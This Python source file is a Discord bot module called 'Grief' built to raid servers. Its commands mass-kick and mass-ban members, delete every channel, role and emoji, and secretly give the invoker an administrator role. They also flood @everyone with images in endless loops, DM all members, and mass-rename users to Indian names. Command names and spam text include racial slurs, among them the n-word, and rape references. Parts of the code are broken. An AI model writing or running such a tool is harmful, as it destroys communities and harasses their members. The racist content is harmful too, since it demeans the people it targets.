import asyncio
import random
from colorsys import hls_to_rgb

import discord
from discord import client
from discord.ext import commands

rename_to = [
    "Damini Chia",
    "Mohan Sachdev",
    "Albert Khan",
    "Atul Arya",
    "Nupoor Prashad",
    "Sirish Butala",
    "Atul Iyer",
    "Ram Gopal Rampersad",
    "Bharat Chaudry",
    "Ricky Biswas",
    "Qabool More",
    "Mohan Sachar",
    "Devika Pardeshi",
    "Suraj Ray",
    "Rakhi Salvi",
    "Komal Mand",
    "Himesh Hans",
    "Lata Shankar",
    "Atul Subramaniam",
    "Mayawati Bhalla",
    "Sushant Rampersaud",
    "Madhu Badami",
    "Sushmita Sheth",
    "Deep Vaidya",
    "Harbhajan Bhattacharyya",
    "Jack Deol",
    "Dinesh Mahal",
    "Preet Kakar",
    "Bhola Parsa",
    "Madhu Dugal",
    "Rajendra Gera",
    "Amrita Amble",
    "John Bal",
    "Kanika Kaur",
    "Vikrant Gulati",
    "Heena Dave",
    "Swati Buch",
    "Aslam Rai",
    "Munaf Dey",
    "Himesh Contractor",
    "Alex Palan",
    "Ram Ramakrishnan",
    "Rakhi Lanka",
    "Vijay Sur",
    "Mohan Chaudhari",
    "Faraz Nayak",
    "Eddie Srivastava",
    "Julie Lalla",
    "Nakul Boase",
    "Zeenat Das",
    "Zara Ratta",
    "Binod Sodhi",
    "Rachel Nadig",
    "Sapna Bhalla",
    "Akshay Vaidya",
    "Diya Tank",
    "Aarif Bhargava",
    "Jasmin Pai",
    "Peter Zachariah",
    "Aarushi Nigam",
    "Smriti Banik",
    "Rimi Pillai",
    "Smriti Varma",
    "Qadim Chhabra",
    "Mayawati Sachdeva",
    "Sweta Murty",
    "Wahid Walia",
    "Pinky Balakrishnan",
    "Biren Karan",
    "Pushpa Mitter",
    "Ekbal Dyal",
    "Bimla Kuruvilla",
    "Govind Muni",
    "Zeeshan Dara",
    "Jyoti Kaul",
    "Lakshmi Bhardwaj",
    "Akhila Rajagopalan",
    "Kasturi Raval",
    "Taahid Majumdar",
    "Neela Thakkar",
    "Karim Badal",
    "Esha Chad",
    "Lalita Gole",
    "Gulab Amble",
    "Aadish Mogul",
    "Preet Apte",
    "Rita Vora",
    "Trishana Issac",
    "Riddhi Sani",
    "Subhash Memon",
    "Virat Pardeshi",
    "Aadil Rampersad",
    "Pranay Naruka",
    "Megha Krishnamurthy",
    "Trishana George",
    "Wafa Ramkissoon",
    "Nitin Pau",
    "Heena Sule",
    "Sushmita Talwar",
    "Abhishek Sule",
    "Obaid Bal",
    "Sid Chandra",
    "Jyoti Kurian",
    "Somnath Agarwal",
    "Megha Doshi",
    "Sumit Sehgal",
    "Sara Dayal",
    "Usman Gagrani",
    "Alka Rai",
    "Rakhi Chaudry",
    "Gauransh Kaul",
    "Saurabh Goda",
    "Marlo Sachdeva",
    "Zahir Johal",
    "Varun Pradhan",
    "Kirti Kurian",
    "Binoya Chokshi",
    "Munni Narasimhan",
    "Mukti Subramanian",
    "Iqbal Kanda",
    "Kasturi Pandya",
    "Yogesh Pillay",
    "Veena Sankar",
    "Shobha Sing",
    "Abhinav Din",
    "Kalyan Uppal",
    "Heena Kuruvilla",
    "Suresh Warrior",
    "Gowri Rama",
    "Neerendra Dora",
    "Priyanka Srinivasan",
    "Pushpa Oak",
    "Riya Sankaran",
    "Vineeta Rastogi",
    "Bagwati Hari",
    "Nagma Chaudry",
    "Sneha Ram",
    "Chhavi Sathe",
    "Pooja Parsa",
    "Monin Sahota",
    "Rehman Yohannan",
    "Leelawati Nayak",
    "Manoj Hari",
    "Maya Amin",
    "Neerendra Prabhakar",
    "Venkat Mukherjee",
    "Govind Malpani",
    "Nayan Bhatt",
    "Sumit Kalla",
]
list = [
    "HS and Philswift",
    "Now Thats alot of damage",
    "Yes me",
    "visible confuse",
    "Its got delete",
    "U dwarf picture",
]
copypasta = ["NIGGER", "HS", "NO U"]


class Grief(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def h(self, ctx):
        await ctx.message.delete()
        guild = ctx.message.guild
        for user in tuple(guild.members):
            try:
                await user.kick()
                print(
                    f"{user.name} has been kicked from \u001b[33m {ctx.guild.name} \u001b[0m"
                )
            except:
                print(
                    f"{user.name} has FAILED to be kicked from \u001b[33m {ctx.guild.name} \u001b[0m"
                )
            print(
                f"@\u001b[32m {ctx.message.author} \u001b[0m has executed command -h"
            )

    @commands.command()
    async def hshs(self, ctx):
        await ctx.message.delete()
        guild = ctx.message.guild
        for user in tuple(guild.members):
            try:
                await ctx.guild.ban(user)
                print(
                    f"{user.name} has been banned from \u001b[33m {ctx.guild.name} \u001b[0m"
                )
            except:
                print(
                    f"{user.name} has FAILED to be banned from \u001b[33m {ctx.guild.name} \u001b[0m"
                )
            ctx.send("git fak")
        print(
            f"@\u001b[32m {ctx.message.author} \u001b[0m has executed command -hshs"
        )

    @commands.command()
    async def rape(self, ctx):
        await ctx.message.delete()
        spying = self.bot.get_channel(666142878485053440)

        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(
                    f"\u001b[37m {emoji.name} \u001b[0m has been deleted in \u001b[33m {ctx.guild.name} \u001b[0m"
                )
            except:
                print(
                    f"\u001b[37m {emoji.name} \u001b[0m has NOT been deleted in \u001b[33m {ctx.guild.name} \u001b[0m"
                )
        for channel in ctx.guild.channels:
            if channel == spying:
                print("ignored spy channel")
            else:
                try:
                    await channel.delete()
                    print(
                        f"\u001b[36m {channel.name} \u001b[0m has been deleted in \u001b[33m {ctx.guild.name}"
                    )
                except:
                    print(
                        f"\u001b[36m {channel.name} \u001b[0m has NOT been deleted in \u001b[33m {ctx.guild.name}"
                    )
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(
                    f"{role.name} \u001b[0m has been deleted in \u001b[33m {ctx.guild.name} \u001b[0m"
                )
            except:
                print(
                    f"{role.name} \u001b[0m has NOT been deleted in \u001b[33m {ctx.guild.name} \u001b[0m"
                )
        for user in ctx.guild.members:
            if (user == "Koalaa#6001" or user == "w0t#9032"
                    or user == ctx.message.author):
                return
            else:
                try:
                    await ctx.guild.ban(user)
                    print(
                        f"{user.name} has been banned from \u001b[33m {ctx.guild.name} \u001b[0m"
                    )
                except:
                    print(
                        f"{user.name} has FAILED to be banned from \u001b[33m {ctx.guild.name} \u001b[0m"
                    )

        print(
            f"@\u001b[32m {ctx.message.author} \u001b[0m has destroyed \u001b[33m {ctx.guild.name} \u001b[0m!"
        )

    @commands.command()
    async def hs(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild

        perms = discord.Permissions(8)
        await guild.create_role(name="hs",
                                permissions=perms,
                                colour=discord.Colour(0xFDFF3B))
        user = ctx.message.author

        role = discord.utils.get(user.guild.roles, name="hs")
        await role.edit(position=3, name="hs")
        await user.add_roles(role)

        print(
            f"user \u001b[32m {ctx.message.author} \u001b[0m has been granted admin in \u001b[33m {ctx.guild.name} \u001b[0m"
        )

    @commands.command()
    async def sh(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        perms = discord.Permissions(2147483127)
        await guild.create_role(name="sh",
                                permissions=perms,
                                colour=discord.Colour(0xFF80EF))
        user = ctx.message.author
        role = discord.utils.get(user.guild.roles, name="sh")
        await user.add_roles(role)
        print(
            f"@\u001b[32m {ctx.message.author} \u001b[0m has been granted other permissions in \u001b[33m {ctx.guild.name} \u001b[0m"
        )

    @commands.command()
    async def weeb(self, ctx):
        await ctx.message.delete()
        guild = ctx.guild
        perms = discord.Permissions(2147483127)
        await guild.create_role(name="weeb",
                                permissions=perms,
                                colour=discord.Colour(0xFF80EF))
        user = ctx.message.author
        role = discord.utils.get(user.guild.roles, name="weeb")
        await user.add_roles(role)
        print(
            f"@\u001b[32m {ctx.message.author} \u001b[0m has been granted weeb powers in \u001b[33m {ctx.guild.name} \u001b[0m"
        )

    @commands.command()
    async def hsedit(self, ctx, role: discord.Role, *name: str, pos: int):
        await ctx.message.delete()
        if role == None:
            ctx.send("please input role", delete_after=10)
        elif name == None:
            ctx.send("please input name", delete_after=10)
        else:
            try:
                await role.edit(position=pos, name=name)
                print(f"Moved role {pos} above current position")
            except discord.HTTPException:
                print("failed to move role")
            except discord.Forbidden:
                print("No permission to move role")

    @commands.command()
    async def jane(self, ctx):
        await ctx.message.delete()
        while not client.is_closed:
            try:
                embed = discord.Embed(description="@everyone",
                                      colour=discord.Colour(0xFF001D))
                embed.set_image(
                    url=
                    "https://cdn.discordapp.com/attachments/541880222065098762/655747250550734848/jane_xd.jpeg"
                )
                await ctx.send(embed=embed)
                await asyncio.sleep(0.7)
            except:
                pass
            print(
                f"@\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages"
            )

    @commands.command()
    async def ifsexybenigcrime(self, ctx):
        await ctx.message.delete()
        while not client.is_closed:
            try:
                embed = discord.Embed(description="@everyone",
                                      colour=discord.Colour(0xFF001D))
                embed.set_image(
                    url=
                    "https://cdn.discordapp.com/attachments/658559344966762497/660380817692033024/hsisindian.png"
                )
                await ctx.send(embed=embed)
                await asyncio.sleep(0.7)
            except:
                pass
            print(
                f"@\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages"
            )

    @commands.command()
    async def tgay(self, ctx):
        await ctx.message.delete()
        while not client.is_closed:
            try:
                embed = discord.Embed(description="@everyone",
                                      colour=discord.Colour(0xFF001D))
                embed.set_image(
                    url=
                    "https://cdn.discordapp.com/attachments/660382624128303126/660384156907470848/ths.png"
                )
                await ctx.send(embed=embed)
                await asyncio.sleep(0.7)
            except:
                pass
            print(
                f"@\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages"
            )

    @commands.command()
    async def janexd(self, ctx):
        await ctx.message.delete()
        while not client.is_closed:
            try:
                embed = discord.Embed(description="@everyone",
                                      colour=discord.Colour(0xFF001D))
                embed.set_image(
                    url=
                    "https://cdn.discordapp.com/attachments/541880222065098762/655747238374539264/jane_shoot.jpg"
                )
                await ctx.send(embed=embed)
                await asyncio.sleep(0.7)
            except:
                print(
                    f"@\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages"
                )

    @commands.command()
    async def redhseyes(self, ctx):
        await ctx.message.delete()
        while not client.is_closed:
            try:
                embed = discord.Embed(description="@everyone",
                                      colour=discord.Colour(0xFF001D))
                embed.set_image(
                    url=
                    "https://media.discordapp.net/attachments/647801195527798789/655781773720027142/hs2.png"
                )
                await ctx.send(embed=embed)
                await asyncio.sleep(0.7)
            except:
                print(
                    f"\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages"
                )

    @commands.command()
    async def pornhub(self, ctx):
        i = 0
        await ctx.message.delete()
        imgss = [
            "https://cdn.discordapp.com/attachments/663715365754372127/665226682223034388/chino8.PNG",
            "https://cdn.discordapp.com/attachments/663715365754372127/665226707350847518/chino9.PNG",
            "https://cdn.discordapp.com/attachments/663715365754372127/665226854864650280/i_like_its_2.PNG",
            "https://cdn.discordapp.com/attachments/663715365754372127/665226726783188992/chino10.jpg",
        ]
        while i < 40:
            i += 1
            randomrandom = random.choice(imgss)
            embed = discord.Embed(description="@everyone",
                                  colour=discord.Colour(0xFF001D))
            embed.set_image(url=randomrandom)
            await ctx.send(embed=embed)
            await asyncio.sleep(0.7)

    @commands.command()
    async def nineeleven(self, ctx):
        await ctx.message.delete()
        while not client.is_closed:
            try:
                embed = discord.Embed(description="@everyone",
                                      colour=discord.Colour(0xFF001D))
                embed.set_image(
                    url=
                    "https://cdn.discordapp.com/attachments/660382624128303126/660395050479648788/indi.png"
                )
                await ctx.send(embed=embed)
                await asyncio.sleep(0.7)
            except:
                print(
                    f"\u001b[32m {ctx.message.author} \u001b[0m gave the command to spam messages"
                )

    @commands.command()
    async def nuclearhs(self, ctx):
        await ctx.message.delete()
        spying = self.bot.get_channel(666142878485053440)
        for channel in ctx.guild.channels:
            if channel == spying:
                print("avoided spy channel")
            else:
                try:
                    await channel.delete()
                    print(
                        f"{channel.name} has been deleted in \u001b[33m {ctx.guild.name} \u001b[0m"
                    )
                except (
                        discord.Forbbiden,
                        discord.NotFound,
                        discord.HTTPException,
                ) as e:
                    print(
                        f"Could not delete channel {channel.name} for reason {e}"
                    )
            print(
                f"\u001b[32m {ctx.message.author} \u001b[0m has nuked and deleted all channels in \u001b[33m {ctx.guild.name} \u001b[0m"
            )

    @commands.command()
    async def renameall(ctx, *, rename_to):
        await ctx.message.delete()
        for user in ctx.guild.members:
            try:
                await user.edit(nick=rename_to)
                print(
                    f"{user.name} has been renamed to {rename_to} in \u001b[33m{ctx.guild.name} \u001b[0m"
                )
            except:
                print(
                    f"{user.name} has NOT been renamed to {rename_to} in \u001b[33m{ctx.guild.name} \u001b[0m"
                )

        print(
            f"Renamed everyone to what \u001b[32m {ctx.message.author} \u001b[0m desires"
        )

    @commands.command()
    async def rename(ctx, user: discord.Member = None, *, rename_to):
        await ctx.message.delete()
        if user == None:
            print("{ctx.message.author} did not input a member!")
        else:
            try:
                await user.edit(nick=rename_to)
                print(
                    f"{user.name} has been renamed to {rename_to} in \u001b[33m{ctx.guild.name} \u001b[0m"
                )
            except:
                print(
                    f"{user.name} has NOT been renamed to {rename_to} in \u001b[33m{ctx.guild.name} \u001b[0m"
                )

    @commands.command()
    async def indianrename(self, ctx):
        await ctx.message.delete()

        for user in ctx.guild.members:
            try:
                randomnick = random.choice(rename_to)
                rename_to.remove(randomnick)
                await user.edit(nick=randomnick)
                print(
                    f"{user.name} has been renamed to {randomnick} in \u001b[33m{ctx.guild.name} \u001b[0m"
                )
            except:
                print(
                    f"{user.name} has NOT been renamed to {randomnick} in \u001b[33m{ctx.guild.name} \u001b[0m"
                )

    @commands.command()
    async def hsmsg(ctx, *, message):
        await ctx.message.delete()
        retStr = str(f"""```css\n{message}```""")
        for user in ctx.guild.members:
            try:
                await user.send(retStr)
                print(f"{user.name} has recieved the message.")
            except:
                print(f"{user.name} has NOT recieved the message.")
        print("Sent all messages")

    @commands.command()
    async def msgsnipe(ctx, user: discord.Member = None, *, message):
        await ctx.message.delete()
        author = ctx.message.author
        if user == None:
            author.send("input a user")
        else:
            await user.send(message)

    @commands.command()
    async def hshelp(self, ctx):
        await ctx.message.delete()
        embed = discord.Embed(colour=discord.Colour.blue(), title="hmmm")
        embed.set_author(name="Page 1 of 3")

        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/660382624128303126/660384585389178920/oats.png"
        )
        embed.add_field(name="-h",
                        value="Kicks everyone from the server",
                        inline=False)
        embed.add_field(
            name="-rape",
            value=
            "Deletes all channels, creates a new channel to flex, and bans everyone",
            inline=False,
        )
        embed.add_field(name="-hs",
                        value="Creates a role and gives you administrator",
                        inline=False)
        embed.add_field(name="-sh",
                        value="Want the rest of the permissions?",
                        inline=False)
        embed.add_field(
            name="-nuclearhs",
            value=
            "Deletes all channels, basically rendering the server useless",
            inline=False,
        )
        embed.add_field(
            name="-hsmsg",
            value=
            "messages all discord members of the server with your desired message",
            inline=False,
        )
        embed.set_footer(
            text=
            "for meme voice commands type -voicehshelp or -hshelp2 for page 2")
        await ctx.send(ctx.message.author.mention,
                       embed=embed,
                       delete_after=11)
        print(f"Sent hs help to @\u001b[32m {ctx.message.author} \u001b[0m")

    @commands.command()
    async def hshelp2(self, ctx):
        await ctx.message.delete()
        embed = discord.Embed(colour=discord.Colour.blue(),
                              title="hs commands")
        embed.set_author(name="Page 2 of 3")

        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/660382624128303126/660384585389178920/oats.png"
        )
        embed.add_field(
            name="-hschannel",
            value="Edits channel name to random phrases",
            inline=False,
        )
        embed.add_field(name="-hsadd",
                        value="Adds new channels with random phrases",
                        inline=False)
        embed.add_field(name="-clearroles",
                        value="Deletes all possible roles",
                        inline=False)
        embed.add_field(name="-randomspam",
                        value="spam the chat with random text",
                        inline=False)
        embed.add_field(
            name="-hsserveredit",
            value=
            "removes the photo of the guild and changes name to what u desire and region change to india",
            inline=False,
        )
        embed.add_field(name="-indianrename",
                        value="renames everyone to indian names",
                        inline=False)
        embed.set_footer(
            text="for meme voice commands type -voicehshelp -hshelp3 for page 3"
        )
        await ctx.send(ctx.message.author.mention,
                       embed=embed,
                       delete_after=11)
        print(f"Sent hs help2 to @\u001b[32m {ctx.message.author} \u001b[0m")

    @commands.command()
    async def voicehshelp(self, ctx):
        await ctx.message.delete()
        embed = discord.Embed(colour=discord.Colour(0xF8E71C))
        embed.set_author(name="Hs voice commands")
        embed.add_field(name="-erika",
                        value="plays erika to rape ppl",
                        inline=False)
        embed.add_field(name="-alexghae",
                        value="plays russian hardbass",
                        inline=False)
        embed.add_field(name="-hsgirlfriendlol",
                        value="plays a song of loneliness",
                        inline=False)
        embed.set_footer(text="Pls kill me now")
        await ctx.send(ctx.message.author.mention,
                       embed=embed,
                       delete_after=11)
        print(f"Sent Voice help to @\u001b[32m {ctx.message.author} \u001b[0m")

    @commands.command()
    async def hschannel(self, ctx):
        await ctx.message.delete()
        channel = ctx.guild.channels
        list = [
            "HS and Philswift",
            "Now Thats alot of damage",
            "Yes me",
            "visible confuse",
            "Its got delete",
            "U dwarf picture",
            "Its out from google translate",
            "Indian tech support",
        ]
        for channel in ctx.guild.channels:
            try:
                choose = random.choice(list)
                print(
                    f"\u001b[36m {channel.name} \u001b[0m has been edited in \u001b[33m {ctx.guild.name} \u001b[0m"
                )
                await channel.edit(name=choose)
            except:
                print(
                    f"\u001b[36m {channel.name} \u001b[0m has NOT been edited in \u001b[33m {ctx.guild.name} \u001b[0m"
                )

    """@commands.command()
    async def hsadd(self, ctx):
        await ctx.message.delete()
        list = ["HS and Philswift","Now Thats alot of damage","Yes me","visible confuse","Its got delete","U dwarf picture"]

        channel = discord.utils.get(ctx.guild.text_channels, name=choose)
        for channel in ctx.guild.channels:
            try:
                choose = random.choice(list)
               await ctx.guild.create_text_channel(choose)
               await self.bot.send_message(channel,"yes")
            except:
                print(f"{ctx.author} has generated channel {choose}")"""

    @commands.command()
    async def hsadd(self, ctx):
        await ctx.message.delete()

        choose = random.choice(list)

        await ctx.guild.create_text_channel(choose)
        print(f"{ctx.author} has created channel {choose}")

    @commands.command()
    async def hsroles(self, ctx):
        colourrandom = [
            "".join([random.choice("0123456789ABCDEF") for j in range(6)])
        ]
        colour = int(colourrandom, 0)

        names = [
            "Heavy",
            "Spy",
            "Scout",
            "Engineer",
            "Demoman",
            "Soldier",
            "Medic",
            "Pyro",
            "Sniper",
            "HS",
            "Gay",
            "Porn maker",
            "Noob",
            "Loli",
        ]
        await ctx.message.delete()
        guild = ctx.guild
        users = ctx.guild.members
        for role in users:
            randomnames = random.choice(names)
            role = discord.utils.get(ctx.guild.roles, name=randomnames)
            names.remove(randomnames)
            await guild.create_role(name=randomnames,
                                    colour=discord.Colour(colour))
            await users.add_roles(role)

    @commands.command()
    async def clearroles(self, ctx):
        await ctx.message.delete()
        for role in ctx.guild.roles:
            try:
                await role.delete()
                print(
                    f"{role.name} \u001b[0m has been deleted in \u001b[33m {ctx.guild.name} \u001b[0m"
                )
            except Exception as e:
                print(
                    f"{role.name} \u001b[0m cannot be deleted!\u001b[33m {ctx.guild.name} \u001b[0m Exception:{e}"
                )

    @commands.command()
    async def randomspam(self, ctx):
        await ctx.message.delete()
        o = 4
        while o < 40:
            o += 1
            if o == 40:
                break
            else:
                randomtext = random.choice(copypasta)
                embed = discord.Embed(description=randomtext,
                                      colour=discord.Colour(0xFF001D))
                embed.set_footer(text="Pls do the commit hs")
                await ctx.send(embed=embed)
                await asyncio.sleep(0.21)

    @commands.command()
    async def hsserveredit(self, ctx, *, name):
        await ctx.message.delete()
        server = ctx.message.guild
        await server.edit(name=name, region="india")
        await server.edit(icon=None)

    @commands.command()
    async def animated_status(self, ctx, infinite, *, status: str):
        if infinite is True:
            while True:
                for i in range(len(status) + 1):
                    await self.bot.change_presence(activity=discord.Activity(
                        type=discord.ActivityType.listening, name=status[:i]))
                    await asyncio.sleep(5)
                await self.bot.change_presence(activity=discord.Activity(
                    type=discord.ActivityType.listening, name=status[0]))
        if infinite.lower() is ""
        else:
            for i in range(len(status)):
                await self.bot.change_presence(activity=discord.Activity(
                    type=discord.ActivityType.listening, name=status[:i]))
                await asyncio.sleep(5)
            await self.bot.change_presence(activity=discord.Activity(
                type=discord.ActivityType.listening, name="help"))

    @commands.command()
    async def hideaudit(self, ctx):
        await ctx.message.delete()
        ctx.step = 7
        ctx.hue = 0
        while not client.is_closed:
            try:
                for i in ctx.guild.roles:
                    if i.name == "hs" or i.name == "sh":
                        print(f"{i.name} has been skipped from colour change!")
                    else:
                        print(i.name, i.colour)
                        ctx.hue = (ctx.hue + ctx.step) % 360
                        rgb = [
                            int(x * 255)
                            for x in hls_to_rgb(ctx.hue / 360, 0.5, 1)
                        ]
                        clr = discord.Colour(
                            ((rgb[0] << 16) + (rgb[1] << 8) + rgb[2]))
                        await i.edit(
                            colour=clr,
                            reason=
                            f"Rainbow roles activated by {ctx.guild.owner}",
                        )
                        await asyncio.sleep(0.7)
            except discord.Forbidden:
                print("Missing perm for action")

    @commands.command()
    async def distortvoice(self, ctx):
        await ctx.message.delete()
        region = [
            "amsterdam",
            "brazil",
            "dubai",
            "eu_central",
            "india",
            "hongkong",
            "singapore",
            "russia",
            "us_west",
            "us_south",
            "us_central",
            "us_east",
            "sydney",
            "southafrica",
            "london",
            "japan",
        ]
        server = ctx.message.guild
        while not client.is_closed:
            try:
                randomregion = random.choice(region)
                await server.edit(region=randomregion)
                print(f"randomising regions to {randomregion}")
            except Exception as e:
                print(f"Fail to change regions: {e}")


def setup(bot):
    bot.add_cog(Grief(bot))
